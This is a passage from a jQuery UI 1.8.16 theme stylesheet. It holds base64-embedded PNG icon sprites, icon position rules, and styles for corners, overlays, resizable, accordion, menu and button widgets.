8rZT+XT3S3ub+tKJbbLd5diTVp50+zahyeHSslJ/YPrU0fuazrZO2CZ92/ZCCVXlGRiZKPJyPPRxyIFWeXLQBXJBKiq/3divEAN6ZwM200Qjm7EJBZeWm/PRWVCbYK7s7u2l4XaCz+lzgOfMfhMonXr7TWzeZb98dbgIzBT8Ub8eYYUqfZ4rVJ/MDbIDgPqTulJ/xvntWAtjIisqnwxOkGz0n077FARoY79GdA6HPE4rOy196NiMWHTZlSSApcOgXpy/fHV2joaNKu3ffsAnRcBf4K/6NcIG6tIxk3HyoXPjASqfUgXbYN5PzpL2njkR9QMjeDTVHDTCgRuxOegjoO0FvKzP/t/gmVdI24+G7NIe8JX6Wv3dDyldMA+4YB5wwTygtd+dwRqaTqrLb1l73zTSN52CNpnHuQOYPsDblybgxfkXh/oVtr+N1DEBJdhRJyd/Bd/q1z+cbNrD17iVKyajcnv9arhOkRPgsruuD6DmNPwpDNrLw2CoTgHni4yALr0L29+tiKAEIPn868ejx//8rpWP3OEOl5On9OwpcQm0MhafP/ey8f1uvDNIgGLQG8z4YO99ENgg95etwv4uYJYY8fUGHYH6j6fscHFZMftlAl9i+9XL73X3N/n+ZStOzfVfRvYXhrbdKOpEgVQTg/wsDuDD3kwOfQNMTJ5y+/ltUDWLunyxnRF46IqlBzGMY4X7inggREFioIyMjIyMHWCIB6ZNKAcXseo3vLTQTkVE7348dlwJJSz0+wLfmi8BhZqfw3D4ww/wHVLnEd5/fgYvXsDZ3MlsvYUbbnDjDZ3MN3TJG4+bxjAaDl8TBri9qxEw1ccao2wTNAMLHo2f+sjrXwb/9qHoYqgPMBXJTVfOpmrZH23y6uvo0LHSyY6fHGwKfHJlAuMFvObjDYrIqxBgQi20h7Hd/nYVLmno+eaNUm/eeH2GCuopntnhBJAlI2AHo9CCh1I1QxUdAbqqGY9BBLwyc3W4wYVhvY8A4BoIc1l5M7vnPWphZW9/Ses3n37y9a0uGqFwFQZsQQbd386DogpgEk+dzynsAZMJXq8+ns9NeukJ0PYrNATGGefJQlhkLo7DTXr+y3bNiOsDvrXTz/C2q1DXZH84iRNwrP88Nj+u2DjYEE6RBxD9Knj16ujVHC67A7422o02RwD3gB+t7EblWvu9geOFxSnd3ROmT+nJyQkhoPlsxVONc/3TEdBos+jtA+ZzcwHgTvD1cDjaYCcItA8w9i88A8b+mqSjc6Pvqd998QguEQPmQMeo23ODN86+p0/bn1buBkT6+oBhNZ/PYY4ZAHYb3PRd4LkZmPX68NRtMZn4ASvdA+qf0jMA5MP9eeg28Nug9QiLnj5A33U1MAES6xHAUNpz/9zFAYE1gqQDMT3G6xI9pwdw/aIgKoHCS1YGlRnSq9yCjdXjgN3j+N27YyROHxmuNAeNKPpYuXIyIyMjYy0M8eros59MF/PT2c602T7eA7zvhJ9dr/vzDjXaLp4Yc5+0wllzxzHv3gdmMMM7/CcQzKgVBqYTmFn+Z+mKm8J7k0A5F/jgCfjQ1WBhQyiOqD0lYuqBb+AyzMw9Ha2G3m6c8qQx+AlqnIceQp+Sb6i9UyQWbhr54+AjnZ0VzW2TAN0DmBT6PWmc6jDBE2PK2u+nF43dyP7Q0t1pOcX2fdRvH0mF2Q4JqN35rnHjVIeaXfIAVyUuw/aHCCiJy9iF5l1621zweI8KZrPZ9iJdb7DXJ3US0OSrtZ10imt7wHY7QesAzUMz1oZ3noB3qFJ/H18j97FYuw8QDN4oeKf30osvcSW2ExLo+VcbuAuo/sUIm8fMG9xocO3Ea19J9gFYivnHJ2KnyfovZlgW3v6ySx32abQiIyMjIyPjhlFDTLxpwIgFMnTp6A3g4IDKNY+stkwAMAoIAbasxBXqUWneSAWTMjt50lTqT29rFjvXohjsDNm2YPXDFlICmrJOZ3t6tHm8AiEAl0sCeLIIorIRt+cFbew/QRsoAXb4o1XSfoywzm0FTMAoYBNvLyFu8v8HpLBtD1iKgC17wHb7AI6d9wFbvguAIGTHd4E9wG7jgIyMjIyM+434c2R3HeV/Ffx6jtZu6ijl8h59T655jhR+rdHzDOP6beABCheb8O8/WFXeOyzgf5oAhVYnKxP7CwaAf1afJu8bSrhS6tdaXeGnrRenOqOlz9d6QwYnA/3TLd+GE7qe3chA5YF5DfY0vK3adfOX/gyNp2BW25MHdxAB9qvRiiP3/XpQQFGYDU4+Mi///XumXG8pjvaUAOsBGlf4jJt+YYEzeEzAdw06F19R3juM7D1wita86GR0CKfDHgLuXCc4Bri6vMLdfjMc4VNSUNsdodo2xu/1+Xl/K5+az8jIyMhYG/z5gJTMF1GtKq/a3rpyCvz5gJTMl9GtKq/a3rpyCmfQ4WwZmS+kXFVetb115ST48wEf/AGcfG1iw+tWbpbS2vJ3nQxcVr3lH3z5h972FUTLzYpOVk7l5hD+eYcYwDcAnewOotrZ4OtrPDucqi/LRX0/RR4qx7Nn4U8g+qjffvuN6Gf+nC85vwauHjaYyubqvWYKY4VEfSUMitdnBCT1Ue63R5439m+OgCn6DroAAaHPVQxKth/wkJgHmG8bmQMsT0D6EjDfvhVRKO3ywOQUgRA7nmL1uawZmHf1k+DPBwQ6NdcJ+k6Md1LA5f5ONdhJ8vZ5J0vLHT99srkGOjmJbd/G1r2Nriqnse1AZt1AalU5jW2HsuuG0qvKGRkZGRkZGRG0gcONyXsP9v8D0/IdJADiBNiXl3327WRGgOL/9HC/0XwlIURkRhC4tz6Z/fu7fUf2gHvfB9z3u0BGRkZGRkbGplHcnkgguQoSqtUXuhbs/wPtMwqV0HUJAvj5vk32b8IDuL23yn7qAXZ5u32hbRX7d3o82Df1FZXvbh9QOfhyxldr/+3xgXU9oKmvsHyr7F/XA269/eveBXrsv7N9QALe/tvjA0kPWAXGbvebkbHn+D/J5nMcHzx1UAAAAABJRU5ErkJggg==);}.ui-widget-header .ui-icon,.ui-state-default .ui-icon,.ui-state-hover .ui-icon,.ui-state-focus .ui-icon,.ui-state-active .ui-icon,.ui-state-highlight .ui-icon,.ui-state-error .ui-icon,.ui-state-error-text .ui-icon{background-image: url(data:image/png;base64,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);}/* positioning */.ui-icon-alert { background-position: 0 -144px; }.ui-icon-arrow-1-e { background-position: -32px -32px; }.ui-icon-arrow-1-n { background-position: 0 -32px; }.ui-icon-arrow-1-ne { background-position: -16px -32px; }.ui-icon-arrow-1-nw { background-position: -112px -32px; }.ui-icon-arrow-1-s { background-position: -64px -32px; }.ui-icon-arrow-1-se { background-position: -48px -32px; }.ui-icon-arrow-1-sw { background-position: -80px -32px; }.ui-icon-arrow-1-w { background-position: -96px -32px; }.ui-icon-arrow-2-e-w { background-position: -160px -32px; }.ui-icon-arrow-2-n-s { background-position: -128px -32px; }.ui-icon-arrow-2-ne-sw { background-position: -144px -32px; }.ui-icon-arrow-2-se-nw { background-position: -176px -32px; }.ui-icon-arrow-4 { background-position: 0 -80px; }.ui-icon-arrow-4-diag { background-position: -16px -80px; }.ui-icon-arrowrefresh-1-e { background-position: -160px -64px; }.ui-icon-arrowrefresh-1-n { background-position: -144px -64px; }.ui-icon-arrowrefresh-1-s { background-position: -176px -64px; }.ui-icon-arrowrefresh-1-w { background-position: -128px -64px; }.ui-icon-arrowreturn-1-e { background-position: -96px -64px; }.ui-icon-arrowreturn-1-n { background-position: -80px -64px; }.ui-icon-arrowreturn-1-s { background-position: -112px -64px; }.ui-icon-arrowreturn-1-w { background-position: -64px -64px; }.ui-icon-arrowreturnthick-1-e { background-position: -32px -64px; }.ui-icon-arrowreturnthick-1-n { background-position: -16px -64px; }.ui-icon-arrowreturnthick-1-s { background-position: -48px -64px; }.ui-icon-arrowreturnthick-1-w { background-position: 0 -64px; }.ui-icon-arrowstop-1-e { background-position: -208px -32px; }.ui-icon-arrowstop-1-n { background-position: -192px -32px; }.ui-icon-arrowstop-1-s { background-position: -224px -32px; }.ui-icon-arrowstop-1-w { background-position: -240px -32px; }.ui-icon-arrowthick-1-e { background-position: -32px -48px; }.ui-icon-arrowthick-1-n { background-position: 0 -48px; }.ui-icon-arrowthick-1-ne { background-position: -16px -48px; }.ui-icon-arrowthick-1-nw { background-position: -112px -48px; }.ui-icon-arrowthick-1-s { background-position: -64px -48px; }.ui-icon-arrowthick-1-se { background-position: -48px -48px; }.ui-icon-arrowthick-1-sw { background-position: -80px -48px; }.ui-icon-arrowthick-1-w { background-position: -96px -48px; }.ui-icon-arrowthick-2-e-w { background-position: -160px -48px; }.ui-icon-arrowthick-2-n-s { background-position: -128px -48px; }.ui-icon-arrowthick-2-ne-sw { background-position: -144px -48px; }.ui-icon-arrowthick-2-se-nw { background-position: -176px -48px; }.ui-icon-arrowthickstop-1-e { background-position: -208px -48px; }.ui-icon-arrowthickstop-1-n { background-position: -192px -48px; }.ui-icon-arrowthickstop-1-s { background-position: -224px -48px; }.ui-icon-arrowthickstop-1-w { background-position: -240px -48px; }.ui-icon-battery-0 { background-position: -48px -176px; }.ui-icon-battery-1 { background-position: -64px -176px; }.ui-icon-battery-2 { background-position: -80px -176px; }.ui-icon-battery-3 { background-position: -96px -176px; }.ui-icon-bookmark { background-position: -224px -96px; }.ui-icon-bullet { background-position: -80px -144px; }.ui-icon-calculator { background-position: -112px -112px; }.ui-icon-calendar { background-position: -32px -112px; }.ui-icon-cancel { background-position: 0 -128px; }.ui-icon-carat-1-e { background-position: -32px 0; }.ui-icon-carat-1-n { background-position: 0 0; }.ui-icon-carat-1-ne { background-position: -16px 0; }.ui-icon-carat-1-nw { background-position: -112px 0; }.ui-icon-carat-1-s { background-position: -64px 0; }.ui-icon-carat-1-se { background-position: -48px 0; }.ui-icon-carat-1-sw { background-position: -80px 0; }.ui-icon-carat-1-w { background-position: -96px 0; }.ui-icon-carat-2-e-w { background-position: -144px 0; }.ui-icon-carat-2-n-s { background-position: -128px 0; }.ui-icon-cart { background-position: -48px -112px; }.ui-icon-check { background-position: -64px -144px; }.ui-icon-circle-arrow-e { background-position: -112px -192px; }.ui-icon-circle-arrow-n { background-position: -160px -192px; }.ui-icon-circle-arrow-s { background-position: -128px -192px; }.ui-icon-circle-arrow-w { background-position: -144px -192px; }.ui-icon-circle-check { background-position: -208px -192px; }.ui-icon-circle-close { background-position: -32px -192px; }.ui-icon-circle-minus { background-position: -16px -192px; }.ui-icon-circle-plus { background-position: 0 -192px; }.ui-icon-circle-triangle-e { background-position: -48px -192px; }.ui-icon-circle-triangle-n { background-position: -96px -192px; }.ui-icon-circle-triangle-s { background-position: -64px -192px; }.ui-icon-circle-triangle-w { background-position: -80px -192px; }.ui-icon-circle-zoomin { background-position: -176px -192px; }.ui-icon-circle-zoomout { background-position: -192px -192px; }.ui-icon-circlesmall-close { background-position: -32px -208px; }.ui-icon-circlesmall-minus { background-position: -16px -208px; }.ui-icon-circlesmall-plus { background-position: 0 -208px; }.ui-icon-clipboard { background-position: -160px -128px; }.ui-icon-clock { background-position: -80px -112px; }.ui-icon-close { background-position: -80px -128px; }.ui-icon-closethick { background-position: -96px -128px; }.ui-icon-comment { background-position: -128px -96px; }.ui-icon-contact { background-position: -192px -128px; }.ui-icon-copy { background-position: -176px -128px; }.ui-icon-disk { background-position: -96px -112px; }.ui-icon-document { background-position: -32px -96px; }.ui-icon-document-b { background-position: -48px -96px; }.ui-icon-eject { background-position: -112px -160px; }.ui-icon-extlink { background-position: -32px -80px; }.ui-icon-flag { background-position: -16px -112px; }.ui-icon-folder-collapsed { background-position: 0 -96px; }.ui-icon-folder-open { background-position: -16px -96px; }.ui-icon-gear { background-position: -192px -112px; }.ui-icon-grip-diagonal-se { background-position: -80px -224px; }.ui-icon-grip-dotted-horizontal { background-position: -16px -224px; }.ui-icon-grip-dotted-vertical { background-position: 0 -224px; }.ui-icon-grip-solid-horizontal { background-position: -48px -224px; }.ui-icon-grip-solid-vertical { background-position: -32px -224px; }.ui-icon-gripsmall-diagonal-se { background-position: -64px -224px; }.ui-icon-heart { background-position: -208px -112px; }.ui-icon-help { background-position: -48px -144px; }.ui-icon-home { background-position: 0 -112px; }.ui-icon-image { background-position: -208px -128px; }.ui-icon-info { background-position: -16px -144px; }.ui-icon-key { background-position: -112px -128px; }.ui-icon-lightbulb { background-position: -128px -128px; }.ui-icon-link { background-position: -240px -112px; }.ui-icon-locked { background-position: -192px -96px; }.ui-icon-mail-closed { background-position: -80px -96px; }.ui-icon-mail-open { background-position: -96px -96px; }.ui-icon-minus { background-position: -48px -128px; }.ui-icon-minusthick { background-position: -64px -128px; }.ui-icon-newwin { background-position: -48px -80px; }.ui-icon-note { background-position: -64px -96px; }.ui-icon-notice { background-position: -32px -144px; }.ui-icon-pause { background-position: -16px -160px; }.ui-icon-pencil { background-position: -64px -112px; }.ui-icon-person { background-position: -144px -96px; }.ui-icon-pin-s { background-position: -144px -144px; }.ui-icon-pin-w { background-position: -128px -144px; }.ui-icon-play { background-position: 0 -160px; }.ui-icon-plus { background-position: -16px -128px; }.ui-icon-plusthick { background-position: -32px -128px; }.ui-icon-power { background-position: 0 -176px; }.ui-icon-print { background-position: -160px -96px; }.ui-icon-radio-off { background-position: -96px -144px; }.ui-icon-radio-on { background-position: -112px -144px; }.ui-icon-refresh { background-position: -64px -80px; }.ui-icon-scissors { background-position: -144px -128px; }.ui-icon-script { background-position: -240px -128px; }.ui-icon-search { background-position: -160px -112px; }.ui-icon-seek-end { background-position: -64px -160px; }.ui-icon-seek-first { background-position: -80px -160px; }.ui-icon-seek-next { background-position: -32px -160px; }.ui-icon-seek-prev { background-position: -48px -160px; }.ui-icon-seek-start { background-position: -80px -160px; }.ui-icon-shuffle { background-position: -80px -80px; }.ui-icon-signal { background-position: -32px -176px; }.ui-icon-signal-diag { background-position: -16px -176px; }.ui-icon-squaresmall-close { background-position: -80px -208px; }.ui-icon-squaresmall-minus { background-position: -64px -208px; }.ui-icon-squaresmall-plus { background-position: -48px -208px; }.ui-icon-star { background-position: -224px -112px; }.ui-icon-stop { background-position: -96px -160px; }.ui-icon-suitcase { background-position: -112px -96px; }.ui-icon-tag { background-position: -240px -96px; }.ui-icon-transfer-e-w { background-position: -96px -80px; }.ui-icon-transferthick-e-w { background-position: -112px -80px; }.ui-icon-trash { background-position: -176px -96px; }.ui-icon-triangle-1-e { background-position: -32px -16px; }.ui-icon-triangle-1-n { background-position: 0 -16px; }.ui-icon-triangle-1-ne { background-position: -16px -16px; }.ui-icon-triangle-1-nw { background-position: -112px -16px; }.ui-icon-triangle-1-s { background-position: -64px -16px; }.ui-icon-triangle-1-se { background-position: -48px -16px; }.ui-icon-triangle-1-sw { background-position: -80px -16px; }.ui-icon-triangle-1-w { background-position: -96px -16px; }.ui-icon-triangle-2-e-w { background-position: -144px -16px; }.ui-icon-triangle-2-n-s { background-position: -128px -16px; }.ui-icon-unlocked { background-position: -208px -96px; }.ui-icon-video { background-position: -224px -128px; }.ui-icon-volume-off { background-position: -128px -160px; }.ui-icon-volume-on { background-position: -144px -160px; }.ui-icon-wrench { background-position: -176px -112px; }.ui-icon-zoomin { background-position: -128px -112px; }.ui-icon-zoomout { background-position: -144px -112px; }/* Corner radius */.ui-corner-all, .ui-corner-top, .ui-corner-left, .ui-corner-tl {-moz-border-radius-topleft: 4px;-webkit-border-top-left-radius: 4px;-khtml-border-top-left-radius: 4px;border-top-left-radius: 4px;}.ui-corner-all, .ui-corner-top, .ui-corner-right, .ui-corner-tr {-moz-border-radius-topright: 4px;-webkit-border-top-right-radius: 4px;-khtml-border-top-right-radius: 4px;border-top-right-radius: 4px;}.ui-corner-all, .ui-corner-bottom, .ui-corner-left, .ui-corner-bl {-moz-border-radius-bottomleft: 4px;-webkit-border-bottom-left-radius: 4px;-khtml-border-bottom-left-radius: 4px;border-bottom-left-radius: 4px;}.ui-corner-all, .ui-corner-bottom, .ui-corner-right, .ui-corner-br {-moz-border-radius-bottomright: 4px;-webkit-border-bottom-right-radius: 4px;-khtml-border-bottom-right-radius: 4px;border-bottom-right-radius: 4px;}/* Overlays */.ui-widget-overlay{opacity: .50;filter:Alpha(Opacity=50);}.ui-widget-shadow{margin: -5px 0 0 -5px;padding: 5px;opacity: .20;filter:Alpha(Opacity=20);-moz-border-radius: 5px;-khtml-border-radius: 5px;-webkit-border-radius: 5px;border-radius: 5px;}/* jQuery UI Resizable 1.8.16 */.ui-resizable{position: relative;}.ui-resizable-handle{position: absolute;font-size: 0.1px;z-index: 99999;display: block;}.ui-resizable-disabled .ui-resizable-handle,.ui-resizable-autohide .ui-resizable-handle{display: none;}.ui-resizable-n{cursor: n-resize;height: 7px;width: 100%;top: -5px;left: 0;}.ui-resizable-s{cursor: s-resize;height: 7px;width: 100%;bottom: -5px;left: 0;}.ui-resizable-e{cursor: e-resize;width: 7px;right: -5px;top: 0;height: 100%;}.ui-resizable-w{cursor: w-resize;width: 7px;left: -5px;top: 0;height: 100%;}.ui-resizable-se{cursor: se-resize;width: 12px;height: 12px;right: 1px;bottom: 1px;}.ui-resizable-sw{cursor: sw-resize;width: 9px;height: 9px;left: -5px;bottom: -5px;}.ui-resizable-nw{cursor: nw-resize;width: 9px;height: 9px;left: -5px;top: -5px;}.ui-resizable-ne{cursor: ne-resize;width: 9px;height: 9px;right: -5px;top: -5px;}/* jQuery UI Selectable 1.8.16 */.ui-selectable-helper{position: absolute;z-index: 100;border:1px dotted black;}/* jQuery UI Accordion 1.8.16 */.ui-accordion{width: 100%;}.ui-accordion .ui-accordion-header{cursor: pointer;position: relative;margin-top: 1px;zoom: 1;}.ui-accordion .ui-accordion-li-fix {display: inline;}.ui-accordion .ui-accordion-header-active{border-bottom: 0 !important;}.ui-accordion .ui-accordion-header a{display: block;width:100%;font-size: 0.9em;padding: .2em .3em .2em .3em;}.ui-accordion-icons .ui-accordion-header a{padding-left: 2em;}.ui-accordion .ui-accordion-header .ui-icon{position: absolute;left: .5em;top: 50%;margin-top: -8px;}.ui-accordion .ui-accordion-content{padding: .5em .5em;border-top: 0;margin-top: -2px;position: relative;top: 1px;margin-bottom: 2px;overflow: auto;display: none;zoom: 1;}.ui-accordion .ui-accordion-content-active{display: block;}/* jQuery UI Autocomplete 1.8.16 */.ui-autocomplete{position: absolute;cursor: default;}/* jQuery UI Menu 1.8.16 */.ui-menu{list-style:none;padding: 2px;margin: 0;display:block;float: left;}.ui-menu .ui-menu{margin-top: -3px;}.ui-menu .ui-menu-item{margin:0;padding: 0;zoom: 1;float: left;clear: left;width: 100%;}.ui-menu .ui-menu-item a{text-decoration:none;display:block;padding:.2em .4em;line-height:1.2em;zoom:1;}.ui-menu .ui-menu-item a.ui-state-hover,.ui-menu .ui-menu-item a.ui-state-active{font-weight: normal;margin: -1px;}/* jQuery UI Button 1.8.16 */.ui-button{display: inline-block;position: relative;padding: 0;margin-right: .1em;text-decoration: none !important;cursor: pointer;text-align: center;zoom: 1;overflow: visible;}/* the overflow property removes extra width in IE 